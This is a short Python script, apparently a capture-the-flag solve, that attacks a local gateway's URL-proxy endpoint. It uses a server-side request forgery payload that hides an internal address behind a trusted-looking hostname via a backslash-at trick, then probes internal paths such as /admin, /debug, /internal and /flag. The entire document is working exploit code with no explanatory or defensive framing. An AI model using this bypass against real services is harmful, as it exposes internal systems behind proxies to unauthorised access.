import time, select, subprocess, json, urllib.parse
from ws import connect, send_frame, recv_frame
import requests
GW="http://127.0.0.1:24606/api/proxy"
INNER="http://rates.partner-forex.example.com\\@127.0.0.1:8081"
for p in ["/","/ws","/admin","/status","/feeds","/health","/metrics","/debug","/headers","/api","/v1","/v2","/console","/internal","/flag"]:
    try:
        r=requests.get(GW, params={"url":INNER+p}, timeout=6)
        print(p, r.status_code, r.text[:160].replace("\n"," "))
    except Exception as e: print(p,"ERR",e)
